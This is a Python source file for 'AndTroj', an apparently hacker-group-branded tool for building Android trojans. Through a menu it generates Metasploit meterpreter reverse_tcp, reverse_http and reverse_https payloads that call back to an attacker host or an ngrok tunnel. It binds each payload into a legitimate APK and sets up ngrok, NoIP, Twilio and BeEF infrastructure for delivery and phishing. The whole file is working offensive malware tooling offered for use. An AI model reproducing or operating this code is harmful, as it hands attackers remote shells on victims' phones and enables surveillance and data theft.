#!/usr/bin/env python
# coding=utf-8
# https://t.me/unk9vvn
# AVI
import os, sys, urllib2, time, shutil, socket,  string, subprocess, random, smtplib
from lib.Web.Harvester import harstr
from lib.Web.APK_Attack import apk_atck
from lib.SMS.Harvester import s_harstr
from lib.SMS.APK_Attack import s_apk_atck
from lib.Mail.Mail_Phish import mailph
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from core.start import Tor
from twilio.rest import Client
from urllib import urlopen
from urllib2 import urlopen
from core.start import cls
from core.binder import _binder
from core.eng_menu import _eng_menu



dir = '/usr/share/AndTroj'
tmp = dir + '/tmp/'
ORGN = tmp + "orgapp.apk"
out8 = tmp + 'ngrok.txt'
NPAY = tmp + 'nampay.txt'


def rename():
    RN = ORG.replace(" ", "_")
    ORG_RN = (' ' in ORG) == True
    if ORG_RN == (True):
        shutil.copyfile(ORG, "{0}".format(RN))
        subprocess.call(
            'mv ' + RN + ' ' + ORGN,
            shell=True)
        subprocess.call(
            'echo ' + RN + ' >> ' + NPAY,
            shell=True)
    else:
        subprocess.call(
            'cp ' + ORG + ' ' + ORGN,
            shell=True)
        subprocess.call(
            'echo ' + ORG + ' >> ' + NPAY,
            shell=True)


def main_menu():
    global USER, WAN, LAN, ORG, LHOST, LPORT, LGHOST, LGPORT, NGHOST, NGPORT
    cls()
    clear = '\x1b[0m'
    colors = [36, 32, 34, 35, 31, 37]

    x = """
                              `-/osssssssssssso/-`                    
                          -+sss+-+-`os.yo:++/.o-/sss+-                
                       /sy+++`.h. d`d++m+om/s.h.hy/:+oys/             
                    .sy/// h/h`:d-y:/+-/+-+/-s/sodooh:///ys.          
                  -ys-ss/:y:so-/osssso++++osssso+.oo+/s`:o.sy-        
                `ys:oossyo/+oyo/:`:.-:.:/.:/-.-:/syo/+/s+:oo:sy`      
               /d/:-soh/-+ho-.:::``:- .os: -:`.:`/::sy+:+ysso+:d/     
              sy-..+oo-+h:`-:..hy+y/  :s+.  /y/sh..:/`:h+-oyss:.ys    
             ys :+oo/:d/   .m-yyyo/- ` -:   .+oyhy-N.   /d::yosd.sy   
            oy.++++//d.  ::oNdyo:     .--.     :oyhN+-:  .d//s//y.ys  
           :m-y+++//d`   dyyy++::`. -.o.`+.- .`::/+hsyd   `d/so+++.m: 
          `d/`/+++.m`  /.ohso` ://:///++++///://:  :odo.+  `m.syoo:/d`
          :m`+++y:y+   smyms`   -//+/`ohho`/+//-    omsmo   +y s+oy-m:
          sy:+++y`N`  -.dy+:...-- :: ./hh/. :: --...//hh.:  `N`o+/:-so
          yo-///s-m   odohd.-.--:/o.`+/::/+`.o/:--.--hd:ho   m-s+++-+y
          yo::/+o-m   `yNy/:  ...:+s.//:://.s+:...  :/yNs    m-h++++oy
          oy/hsss`N`  oo:oN-   .-o.:ss:--:ss:.o-.   -My-oo  `N`o+++.so
          :m :++y:y+   sNMy+: `+/:.--:////:--.:/+` -+hNNs   +y-o++o`m:
          `d/::+o+.m`  -:/+ho:.       -//-       ./sdo::-  `m-o++++/d`
           :m-yo++//d` `ommMo//        -:        +oyNhmo` `d//s+++`m: 
            oy /o++//d.  `::/oMss`   `+++s     :yNy+/:   .d//y+--`ys  
             ys-`+o++:d/ `/sdmNysNs+/./-//-//hNyyNmmy+- /d-+y-`::sy   
              sy:..ooo-+h/--.-//odm/hNh--yNh+Ndo//-./:/h+-so+:+/ys    
               /d-o.ssy+-+yo:/:/:-:+sho..ohs/-:://::oh+.h//syo-d/     
                `ys-oosyss:/oyy//::..`.-`.-`:/.//syo+-ys//o/.sy`      
                  -ys.sooh+d-s:+osssysssosssssso:/+/h:/yy/.sy-        
                    .sy/:os.h-`d/o+-/+:o:/+.+o:d-y+h-o+`+ys.          
                       :sy+:+ s//sy-y.`h`m/om:s-y.++/+ys/             
                          -+sss+/o/ s-`y.s+/:++-+sss+-                
                              `-/osssssssssssso/-`                    
                                    Unk9vvN
                              https://t.me/Unk9vvN
                                    AndTroj
"""
    for N, line in enumerate(x.split("\n")):
        sys.stdout.write("\x1b[1;%dm%s%s\n" % (random.choice(colors), line, clear))
        time.sleep(0.01)

    try:
        USER = socket.gethostname()
        LAN = ([l for l in ([ip for ip in socket.gethostbyname_ex(socket.gethostname())[2]
                          if not ip.startswith("127.")][:1], [[(s.connect(('8.8.8.8', 53)),
                          s.getsockname()[0], s.close()) for s in [socket.socket(socket.AF_INET,
                          socket.SOCK_DGRAM)]][0][1]]) if l][0][0])
        WAN = urlopen('http://ip.42.pl/raw').read()
        print '\t[i] USER: {0}'.format(USER)
        print '\t[i]  LAN: {0}'.format(LAN)
        print '\t[i]  WAN: {0}'.format(WAN)
        print '\t[i]  USE CMD: atj'
    except urllib2.URLError:
        print '\t[i] USER: {0}'.format(USER)
        print '\t[i]  LAN: {0}'.format(LAN)
        print '\t[i]  WAN: Disconnected'
        print '\t[i]  USE CMD: atj'

    payld = raw_input("\n\t[1] android/meterpreter/reverse_tcp\n\t"
                      "[2] android/meterpreter/reverse_http\n\t"
                      "[3] android/meterpreter/reverse_https\n\t"
                      "[4] Install Ngrok-Twilio-BeEF-NoIP\n\t"
                      "[5] Social Engineering Menu\n\t"
                      "[0] EXIT\n\t"
                      "\n\nroot@unk9vvn:~# ")

    if payld == "1":
        checkauth = os.path.exists('/root/.ngrok2/ngrok.yml')
        if checkauth == (True):
            HOST = raw_input("\n\t[i] NoIP service can give you a dns domain for one month."
                             "\n\t[1] NoIP-HOST\n"
                             "\n\t[i] The Ngrok Business license can give you twenty ports and the first port for the RAT."
                             "\n\t[2] Ngrok-HOST"
                             "\n\nroot@unk9vvn:~# ")
            ORG = raw_input("\n\t[?] ORG-APK: ")
            if HOST == "1":
                LHOST = raw_input("\t[?] LHOST: ")
                LPORT = raw_input("\t[?] LPORT: ")
                print "\n"
                subprocess.call(
                    'msfvenom --platform android -a dalvik -p android/meterpreter/reverse_tcp LHOST=' + LHOST + ' LPORT=' + LPORT + ' -o ' + tmp + 'payload.apk',
                    shell=True)
                subprocess.call(
                    'echo "reverse_tcp" > ' + tmp + 'protocol.txt',
                    shell=True)
                rename()
                _binder()
            elif HOST == "2":
                NGHOST = "127.0.0.1"
                NGPORT = raw_input("\t[i] NHOST: {0}"
                                   "\n\t[?] NPORT: ".format(NGHOST))
                print "\n"
                subprocess.call(
                    'gnome-terminal --tab -e \'proxychains ngrok tcp ' + NGPORT + '\'',
                    shell=True)
                print "\n"
                chek_nngk = os.path.exists('/usr/share/AndTroj/tmp/ngrok.txt')
                if chek_nngk == (False):
                    pass
                else:
                    subprocess.call(
                        'rm /usr/share/AndTroj/tmp/ngrok.txt',
                        shell=True)
                time.sleep(7.0)
                subprocess.call(
                    'FUZ=$(curl --silent --show-error http://127.0.0.1:4040/api/tunnels | sed -nE '
                    '\'s/.*public_url":"tcp:\/\/0.tcp.ngrok.io:([^"]*).*/\\1/p\') && echo "$FUZ" >> '
                    '/usr/share/AndTroj/tmp/ngrok.txt',
                    shell=True)
                fs = open(out8)
                length = 5
                LGHOST = "0.tcp.ngrok.io"
                LGPORT = fs.read(length)
                subprocess.call(
                    'msfvenom --platform android -a dalvik -p android/meterpreter/reverse_tcp LHOST=' + LGHOST + ' LPORT=' + LGPORT + ' -o ' + tmp + 'payload.apk',
                    shell=True)
                subprocess.call(
                    'echo "reverse_tcp" > ' + tmp + 'protocol.txt',
                    shell=True)
                rename()
                _binder()
            else:
                return HOST
            print "\n"
        else:
            print "\n\t[X] Please selected 4 item for install Ngrok Twilio BeEF & NoIP..."
            main_menu()

    elif payld == "2":
        checkauth = os.path.exists('/root/.ngrok2/ngrok.yml')
        if checkauth == (True):
            HOST = raw_input("\n\t[i] NoIP service can give you a dns domain for one month."
                             "\n\t[1] NoIP-HOST\n"
                             "\n\t[i] The Ngrok Business license can give you twenty ports and the first port for the RAT."
                             "\n\t[2] Ngrok-HOST"
                             "\n\nroot@unk9vvn:~# ")
            ORG = raw_input("\n\t[?] ORG-APK: ")
            if HOST == "1":
                LHOST = raw_input("\t[?] LHOST: ")
                LPORT = raw_input("\t[?] LPORT: ")
                print "\n"
                subprocess.call(
                    'msfvenom --platform android -a dalvik -p android/meterpreter/reverse_http LHOST=' + LHOST + ' LPORT=' + LPORT + ' -o ' + tmp + 'payload.apk',
                    shell=True)
                subprocess.call(
                    'echo "reverse_http" > ' + tmp + 'protocol.txt',
                    shell=True)
                rename()
                _binder()
            elif HOST == "2":
                NGHOST = "127.0.0.1"
                NGPORT = raw_input("\t[i] NHOST: {0}"
                                   "\n\t[?] NPORT: ".format(NGHOST))
                print "\n"
                subprocess.call(
                    'gnome-terminal --tab -e \'proxychains ngrok tcp ' + NGPORT + '\'',
                    shell=True)
                print "\n"
                chek_nngk = os.path.exists('/usr/share/AndTroj/tmp/ngrok.txt')
                if chek_nngk == (False):
                    pass
                else:
                    subprocess.call(
                        'rm /usr/share/AndTroj/tmp/ngrok.txt',
                        shell=True)
                time.sleep(7.0)
                subprocess.call(
                    'FUZ=$(curl --silent --show-error http://127.0.0.1:4040/api/tunnels | sed -nE '
                    '\'s/.*public_url":"tcp:\/\/0.tcp.ngrok.io:([^"]*).*/\\1/p\') && echo "$FUZ" >> '
                    '/usr/share/AndTroj/tmp/ngrok.txt',
                    shell=True)
                fs = open(out8)
                length = 5
                LGHOST = "0.tcp.ngrok.io"
                LGPORT = fs.read(length)
                subprocess.call(
                    'msfvenom --platform android -a dalvik -p android/meterpreter/reverse_http LHOST=' + LGHOST + ' LPORT=' + LGPORT + ' -o ' + tmp + 'payload.apk',
                    shell=True)
                subprocess.call(
                    'echo "reverse_http" > ' + tmp + 'protocol.txt',
                    shell=True)
                rename()
                _binder()
            else:
                return HOST
            print "\n"
        else:
            print "\n\t[X] Please selected 4 item for install Ngrok Twilio BeEF & NoIP..."
            main_menu()

    elif payld == "3":
        checkauth = os.path.exists('/root/.ngrok2/ngrok.yml')
        if checkauth == (True):
            HOST = raw_input("\n\t[i] NoIP service can give you a dns domain for one month."
                             "\n\t[1] NoIP-HOST\n"
                             "\n\t[i] The Ngrok Business license can give you twenty ports and the first port for the RAT."
                             "\n\t[2] Ngrok-HOST"
                             "\n\nroot@unk9vvn:~# ")
            ORG = raw_input("\n\t[?] ORG-APK: ")
            if HOST == "1":
                LHOST = raw_input("\t[?] LHOST: ")
                LPORT = raw_input("\t[?] LPORT: ")
                print "\n"
                subprocess.call(
                    'msfvenom --platform android -a dalvik -p android/meterpreter/reverse_https LHOST=' + LHOST + ' LPORT=' + LPORT + ' -o ' + tmp + 'payload.apk',
                    shell=True)
                subprocess.call(
                    'echo "reverse_https" > ' + tmp + 'protocol.txt',
                    shell=True)
                rename()
                _binder()
            elif HOST == "2":
                NGHOST = "127.0.0.1"
                NGPORT = raw_input("\t[i] NHOST: {0}"
                                   "\n\t[?] NPORT: ".format(NGHOST))
                print "\n"
                subprocess.call(
                    'gnome-terminal --tab -e \'proxychains ngrok tcp ' + NGPORT + '\'',
                    shell=True)
                print "\n"
                chek_nngk = os.path.exists('/usr/share/AndTroj/tmp/ngrok.txt')
                if chek_nngk == (False):
                    pass
                else:
                    subprocess.call(
                        'rm /usr/share/AndTroj/tmp/ngrok.txt',
                        shell=True)
                time.sleep(7.0)
                subprocess.call(
                    'FUZ=$(curl --silent --show-error http://127.0.0.1:4040/api/tunnels | sed -nE '
                    '\'s/.*public_url":"tcp:\/\/0.tcp.ngrok.io:([^"]*).*/\\1/p\') && echo "$FUZ" >> '
                    '/usr/share/AndTroj/tmp/ngrok.txt',
                    shell=True)
                fs = open(out8)
                length = 5
                LGHOST = "0.tcp.ngrok.io"
                LGPORT = fs.read(length)
                subprocess.call(
                    'msfvenom --platform android -a dalvik -p android/meterpreter/reverse_https LHOST=' + LGHOST + ' LPORT=' + LGPORT + ' -o ' + tmp + 'payload.apk',
                    shell=True)
                subprocess.call(
                    'echo "reverse_https" > ' + tmp + 'protocol.txt',
                    shell=True)
                rename()
                _binder()
            else:
                return HOST
            print "\n"
        else:
            print "\n\t[X] Please selected 4 item for install Ngrok Twilio BeEF & NoIP..."
            main_menu()

    elif payld == "4":
        checkauth = os.path.exists('/root/.ngrok2/ngrok.yml')
        print "\n"
        if checkauth == (False):
            Ngrok_Token = raw_input("\n\t[i] Visit & Copy Token > https://dashboard.ngrok.com/auth"
                                    "\n\t[?] Ngrok Token: ")
            Twilio_TOKEN = raw_input("\n\t[i] Visit & Copy Token > https://www.twilio.com/console/project/settings"
                                     "\n\t[?] Twilio Token: ")
            Twilio_SID = raw_input("\n\t[i] Visit & Copy Token > https://www.twilio.com/console/"
                                   "\n\t[?] Twilio SID: ")
            print "\n"
            check = os.path.exists('~/.AndTroj/twilio_token.txt')
            if check == (False):
                subprocess.call(
                    'mkdir /root/.AndTroj',
                        shell=True)
                subprocess.call(
                    'echo "' + Twilio_TOKEN + '" > /root/.AndTroj/twilio_token.txt && echo "' + Twilio_SID + '" > /root/.AndTroj/twilio_sid.txt',
                    shell=True)
            else:
                print "I: Twilio Token installed..."
                pass
            check_geo = os.path.exists('/opt/GeoIP/GeoLiteCity.dat')
            if check_geo == (False):
                subprocess.call(
                    'curl -O http://geolite.maxmind.com/download/geoip/database/GeoLiteCity.dat.gz',
                    shell=True)
                subprocess.call(
                    'gunzip GeoLiteCity.dat.gz && mkdir /opt/GeoIP && mv GeoLiteCity.dat /opt/GeoIP',
                    shell=True)
            else:
                print "I: GeoLiteCity extensions installed..."
                pass
            subprocess.call(
                'sed -i \'137s/.*/        enable: true/\' /usr/share/beef-xss/config.yaml && '
                'sed -i \'156s/.*/            enable: true/\' /usr/share/beef-xss/config.yaml',
                shell=True)
            execut = '#!/bin/bash\n/usr/share/ngrok/ngrok "$@"'
            commandl = open('/usr/bin/ngrok', 'w')
            commandl.write(execut)
            commandl.close()
            ch_ngrok = os.path.exists('/usr/share/ngrok')
            if ch_ngrok == (False):
                subprocess.call(
                    'mkdir /usr/share/ngrok && chmod +x /usr/share/ngrok && chmod +x /usr/bin/ngrok && '
                    'cd /usr/share/ngrok && wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-amd64.zip && '
                    'unzip ngrok-stable-linux-amd64.zip && rm ngrok-stable-linux-amd64.zip && ./ngrok authtoken ' + Ngrok_Token + '',
                    shell=True)
            else:
                print "I: Ngrok tunnel dns installed..."
                pass
            print "\n\t[i] Visit & Register > https://www.noip.com/sign-up\n\t[i] Login & Create Host > " \
                  "https://www.noip.com/login\n "
            check = os.path.exists('/usr/share/noip-2.1.9-1')
            if check == (False):
                subprocess.call(
                    'cd /usr/share/ && wget https://www.noip.com/client/linux/noip-duc-linux.tar.gz && tar xzf '
                    'noip-duc-linux.tar.gz && rm noip-duc-linux.tar.gz && cd noip-2.1.9-1 && make && make install',
                    shell=True)
                print(os.system('noip2 && noip2 -S'))
                main_menu()
            else:
                print(os.system('noip2 && noip2 -S'))
                main_menu()
            print "\n\t[i] Install Completed..."
            main_menu()
        else:
            print "\n\t[i] Install Completed..."
            main_menu()
    elif payld == "5":
        _eng_menu()
    elif payld == "0":
        sys.exit()
    else:
        _eng_menu()



